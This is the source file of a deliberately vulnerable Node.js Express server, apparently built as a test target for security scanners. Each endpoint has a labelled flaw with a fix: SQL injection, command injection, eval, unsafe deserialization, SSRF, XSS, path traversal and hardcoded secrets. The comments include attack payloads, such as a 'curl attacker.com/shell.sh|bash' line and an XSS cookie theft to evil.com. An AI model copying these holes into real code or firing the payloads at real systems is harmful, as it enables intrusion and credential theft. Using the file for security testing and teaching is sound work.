/**
 * =============================================================================
 * nodejs/server.js – TigerGate CNAPP Test: Node.js Express Vulnerable Server
 * =============================================================================
 * PURPOSE: Intentionally vulnerable Express.js application for security testing.
 * Covers: SAST (SonarQube), DAST, API Security, and CNAPP runtime detection.
 *
 * ⚠️  EDUCATIONAL USE ONLY — Never deploy in production.
 *
 * VULNERABILITIES COVERED:
 *   CWE-89  – SQL Injection (×5 endpoints)
 *   CWE-78  – OS Command Injection
 *   CWE-22  – Path Traversal
 *   CWE-502 – Insecure Deserialization (node-serialize)
 *   CWE-918 – Server-Side Request Forgery (SSRF)
 *   CWE-347 – JWT alg:none bypass + weak secret
 *   CWE-798 – Hardcoded Credentials
 *   CWE-601 – Open Redirect
 *   CWE-400 – N+1 Query (Performance / Abuse)
 *   CWE-116 – XSS via res.send without sanitization
 * =============================================================================
 */

'use strict';

const express = require('express');
const mysql = require('mysql');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const serialize = require('node-serialize');
const http = require('http');
const https = require('https');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// =============================================================================
// VULN: CWE-798 – Hardcoded credentials & API keys
// SonarQube Rule: S6418 "Credentials should not be hardcoded"
// WHY BAD: Anyone who reads this file (or git history) gets your DB + AWS access
// FIX: Use environment variables: process.env.DB_PASS, process.env.AWS_KEY
// =============================================================================
const AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE';           // 🔴 HARDCODED!
const AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'; // 🔴!
const JWT_SECRET = 'supersecretkey123';               // 🔴 Weak + hardcoded!
const DB_CONFIG = {
    host: process.env.DB_HOST || 'localhost',
    user: 'root',                                              // 🔴 Hardcoded!
    password: 'root123',                                          // 🔴 Hardcoded!
    database: 'megadb',
};

// VULN: CORS wildcard — any origin can make requests to this API
// SonarQube Rule: S5122 "CORS header should not be set to any origin"
// FIX: Set specific trusted origins: res.setHeader('Access-Control-Allow-Origin', 'https://megacorp.com')
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');            // 🔴 CORS wildcard!
    res.setHeader('Access-Control-Allow-Methods', '*');           // 🔴
    res.setHeader('Access-Control-Allow-Headers', '*');           // 🔴
    // VULN: No security headers set (missing CSP, HSTS, X-Frame-Options)
    next();
});

const db = mysql.createConnection(DB_CONFIG);
db.connect((err) => {
    if (err) console.error('DB connection failed:', err.message); // VULN: Error detail exposed
    else console.log('Connected to MySQL. DB password used:', DB_CONFIG.password); // 🔴 Password logged!
});


// =============================================================================
// ENDPOINT 1: GET /api/users?search=...
// VULN: CWE-89 – SQL Injection via string concatenation
// SonarQube Rule: S3649 "SQL queries should not be vulnerable to injection attacks"
// ATTACK: curl "http://localhost:3000/api/users?search=' OR '1'='1"
// RESULT: Returns ALL users, bypassing any filter
// FIX: Use parameterized queries: db.query('SELECT * FROM users WHERE name = ?', [search])
// =============================================================================
app.get('/api/users', (req, res) => {
    const search = req.query.search || '';
    // 🔴 BAD: User input directly concatenated into SQL!
    const query = `SELECT id, username, email, password FROM users WHERE username LIKE '%${search}%'`;
    db.query(query, (err, results) => {
        if (err) {
            // VULN: CWE-209 – Full error (including SQL) returned to client
            // SonarQube Rule: S4507 "Delivering code in production with debug features activated"
            return res.status(500).json({ error: err.message, sql: err.sql }); // 🔴 Exposes SQL!
        }
        // VULN: Passwords returned in response — no column filtering!
        res.json(results);
    });
});


// =============================================================================
// ENDPOINT 2: GET /api/users/:id
// VULN: IDOR (Insecure Direct Object Reference) — no authorization check
// ATTACK: Any user can access any user's profile by changing the ID
// curl http://localhost:3000/api/users/2   (gets user 2 without being user 2)
// FIX: Check that req.user.id === parseInt(req.params.id) before returning
// =============================================================================
app.get('/api/users/:id', (req, res) => {
    const id = req.params.id;
    // 🔴 BAD: SQL Injection AND IDOR — no auth check, no parameterized query
    const query = `SELECT * FROM users WHERE id = ${id}`;        // 🔴 SQLi!
    db.query(query, (err, results) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(results[0] || {});
    });
});


// =============================================================================
// ENDPOINT 3: POST /api/login
// VULN: CWE-89 – SQL Injection in login → Authentication Bypass
// ATTACK: {"username": "admin'--", "password": "anything"}
// SQL becomes: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
// The -- comments out the password check → login as admin!
// FIX: Use parameterized queries + bcrypt.compare() for passwords
// =============================================================================
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    // 🔴 CRITICAL: SQL Injection allows authentication bypass!
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    console.log(`[LOG] Login attempt: username=${username} password=${password}`); // 🔴 Password logged!
    db.query(query, (err, results) => {
        if (err) return res.status(500).json({ error: err.message });
        if (results.length > 0) {
            // VULN: JWT signed with weak hardcoded secret, no expiry
            const token = jwt.sign(
                { id: results[0].id, username: results[0].username, role: 'admin' },
                JWT_SECRET,      // 🔴 Hardcoded weak secret!
                { expiresIn: '365d' } // BAD: Token valid for a year
            );
            res.json({ token, user: results[0] }); // 🔴 Returns full user object including password hash!
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    });
});


// =============================================================================
// ENDPOINT 4: GET /api/exec?cmd=...
// VULN: CWE-78 – OS Command Injection
// SonarQube Rule: S4721 "OS commands should not be vulnerable to injection attacks"
// ATTACK: curl "http://localhost:3000/api/exec?cmd=id"
//         curl "http://localhost:3000/api/exec?cmd=cat+/etc/passwd"
//         curl "http://localhost:3000/api/exec?cmd=curl+http://attacker.com/shell.sh|bash"
// FIX: Never execute user input as shell commands.
//      Use an allowlist: if (!['ping','date'].includes(cmd)) reject;
// =============================================================================
app.get('/api/exec', (req, res) => {
    const cmd = req.query.cmd;
    // 🔴 CRITICAL: User input executed as OS command!
    exec(cmd, (error, stdout, stderr) => {                        // 🔴 CWE-78!
        res.json({
            stdout,
            stderr,
            error: error ? error.message : null,
            // VULN: Returns full shell output including sensitive system info
        });
    });
});


// =============================================================================
// ENDPOINT 5: GET /api/file?name=...
// VULN: CWE-22 – Path Traversal
// SonarQube Rule: S2083 "I/O function calls should not be vulnerable to path injection attacks"
// ATTACK: curl "http://localhost:3000/api/file?name=../../etc/passwd"
//         curl "http://localhost:3000/api/file?name=../../etc/shadow"
// FIX: Use path.resolve() and verify it starts with the allowed base dir
//      const safe = path.resolve(BASE, name); if (!safe.startsWith(BASE)) reject;
// =============================================================================
app.get('/api/file', (req, res) => {
    const filename = req.query.name;
    // 🔴 BAD: No path normalization — ../../etc/passwd works!
    const filePath = path.join('./uploads', filename);             // 🔴 CWE-22!
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) return res.status(404).json({ error: err.message });
        res.send(data); // BAD: Sends raw file content (no content-type check)
    });
});


// =============================================================================
// ENDPOINT 6: GET /api/fetch?url=...
// VULN: CWE-918 – Server-Side Request Forgery (SSRF)
// ATTACK: curl "http://localhost:3000/api/fetch?url=http://169.254.169.254/latest/meta-data/"
//         Fetches AWS instance metadata → IAM credentials!
// ATTACK 2: curl "http://localhost:3000/api/fetch?url=http://internal-redis:6379"
//           Reaches internal services not accessible from outside
// FIX: Validate URL against allowlist; block private IP ranges (RFC1918)
// =============================================================================
app.get('/api/fetch', (req, res) => {
    const url = req.query.url;
    // 🔴 CRITICAL: Fetches any URL including internal services and cloud metadata!
    const client = url.startsWith('https') ? https : http;
    client.get(url, (response) => {                                // 🔴 CWE-918!
        let data = '';
        response.on('data', chunk => data += chunk);
        response.on('end', () => res.json({ url, status: response.statusCode, body: data }));
    }).on('error', err => res.status(500).json({ error: err.message }));
});


// =============================================================================
// ENDPOINT 7: POST /api/deserialize
// VULN: CWE-502 – Insecure Deserialization via node-serialize
// ATTACK: Send JSON with IIFE function: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',console.log)}()"}
// FIX: Never deserialize data from untrusted sources. Use JSON.parse() only, validate schema.
// =============================================================================
app.post('/api/deserialize', express.text({ type: '*/*' }), (req, res) => {
    try {
        // 🔴 CRITICAL: node-serialize executes embedded JS functions!
        const obj = serialize.unserialize(req.body);                 // 🔴 CWE-502 RCE!
        res.json({ message: 'Deserialized successfully', data: obj });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});


// =============================================================================
// ENDPOINT 8: GET /api/evaluate?code=...
// VULN: CWE-94 – eval() Code Injection
// SonarQube Rule: S1523 "Executing code dynamically is security-sensitive"
// ATTACK: curl "http://localhost:3000/api/evaluate?code=require('child_process').execSync('id').toString()"
// FIX: NEVER use eval() with user input. Use a math expression parser library.
// =============================================================================
app.get('/api/evaluate', (req, res) => {
    const code = req.query.code;
    try {
        // 🔴 CRITICAL: eval() executes arbitrary Node.js code from user input!
        const result = eval(code);                                   // 🔴 CWE-94!
        res.json({ result });
    } catch (e) {
        res.status(500).json({ error: e.message, stack: e.stack }); // 🔴 Stack trace exposed!
    }
});


// =============================================================================
// ENDPOINT 9: GET /api/orders
// VULN: N+1 Query Problem — makes 1 query to get orders, then N queries for each user
// Causes: Database overload, slow responses, potential DoS
// FIX: Use a JOIN to fetch all data in a single query
// =============================================================================
app.get('/api/orders', (req, res) => {
    db.query('SELECT * FROM orders', (err, orders) => {
        if (err) return res.status(500).json({ error: err.message });
        // 🔴 BAD: N+1 — executes one DB query PER order to get the user!
        const results = [];
        let pending = orders.length;
        if (pending === 0) return res.json([]);
        orders.forEach(order => {
            // BAD: N separate queries instead of one JOIN
            db.query(`SELECT * FROM users WHERE id = ${order.user_id}`, (err2, users) => { // 🔴 SQLi + N+1
                results.push({ ...order, user: users[0] });
                if (--pending === 0) res.json(results);
            });
        });
    });
});


// =============================================================================
// ENDPOINT 10: GET /api/redirect?url=...
// VULN: CWE-601 – Open Redirect
// ATTACK: Phishing via: http://trustedsite.com/api/redirect?url=http://evil.com
// Users trust the legitimate domain → follow link → land on attacker site
// FIX: Validate redirect targets against an explicit allowlist
// =============================================================================
app.get('/api/redirect', (req, res) => {
    const url = req.query.url;
    // 🔴 BAD: Redirects to any URL the user provides — open redirect!
    res.redirect(url);                                             // 🔴 CWE-601!
});


// =============================================================================
// ENDPOINT 11: GET /api/xss?input=...
// VULN: CWE-79 – Reflected Cross-Site Scripting
// ATTACK: /api/xss?input=<script>fetch('http://evil.com?c='+document.cookie)</script>
// FIX: Use res.json() not res.send() for API responses. Escape HTML if rendering.
// =============================================================================
app.get('/api/xss', (req, res) => {
    const input = req.query.input;
    // 🔴 BAD: User input echoed directly as HTML
    res.setHeader('Content-Type', 'text/html');
    res.send(`<html><body><p>Hello: ${input}</p></body></html>`); // 🔴 XSS!
});


// =============================================================================
// ENDPOINT 12: GET /api/jwt-verify
// VULN: CWE-347 – JWT Algorithm Confusion (alg:none bypass)
// ATTACK: Send JWT with header {"alg":"none"} — signature verification is skipped!
//         Token: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
// FIX: Always specify expected algorithm: jwt.verify(token, secret, { algorithms: ['HS256'] })
// =============================================================================
app.get('/api/jwt-verify', (req, res) => {
    const token = req.headers['authorization']?.split(' ')[1];
    try {
        // 🔴 BAD: No algorithm restriction — accepts alg:none!
        const decoded = jwt.verify(token, JWT_SECRET);               // 🔴 CWE-347!
        res.json({ valid: true, decoded });
    } catch (e) {
        res.status(401).json({ valid: false, error: e.message });
    }
});


// =============================================================================
// ENDPOINT 13: GET /api/search?q=...
// VULN: SQL Injection via UNION-based data extraction
// ATTACK: /api/search?q=x' UNION SELECT username,password,email,4,5 FROM users--
// FIX: Parameterized query: db.query('SELECT * FROM products WHERE name LIKE ?', [`%${q}%`])
// =============================================================================
app.get('/api/search', (req, res) => {
    const q = req.query.q || '';
    // 🔴 BAD: UNION injection can extract data from other tables!
    const sql = `SELECT id, name, price, description FROM products WHERE name LIKE '%${q}%'`; // 🔴 SQLi
    db.query(sql, (err, results) => {
        if (err) return res.status(500).json({ error: err.message, sql }); // 🔴 SQL exposed
        res.json(results);
    });
});


// =============================================================================
// ENDPOINT 14: POST /api/products (SQL Injection in INSERT)
// VULN: CWE-89 – SQL Injection via INSERT statement
// ATTACK: {"name": "x', 999, (SELECT password FROM users WHERE id=1))-- "}
// FIX: db.query('INSERT INTO products (name, price) VALUES (?, ?)', [name, price])
// =============================================================================
app.post('/api/products', (req, res) => {
    const { name, price } = req.body;
    // 🔴 BAD: String interpolation in INSERT
    const sql = `INSERT INTO products (name, price) VALUES ('${name}', '${price}')`; // 🔴 SQLi!
    db.query(sql, (err, result) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ id: result.insertId, name, price });
    });
});


// =============================================================================
// GLOBAL ERROR HANDLER
// VULN: CWE-209 – Stack trace exposed to users in production
// SonarQube Rule: S4507
// FIX: Log error server-side only; return generic "Internal Server Error" to client
// =============================================================================
app.use((err, req, res, next) => {
    console.error(err);
    // 🔴 BAD: Full stack trace returned to client — reveals server paths and code structure!
    res.status(500).json({
        error: err.message,
        stack: err.stack,                                            // 🔴 Never expose stack traces!
        path: __filename                                             // 🔴 Reveals server file path!
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    // 🔴 BAD: DB password printed on startup — visible in container logs
    console.log(`Server running on port ${PORT}`);
    console.log(`DB Password: ${DB_CONFIG.password}`);            // 🔴 Password in logs!
    console.log(`JWT Secret: ${JWT_SECRET}`);                     // 🔴 Secret in logs!
    console.log(`AWS Key: ${AWS_ACCESS_KEY_ID}`);                 // 🔴 AWS key in logs!
});

module.exports = app;
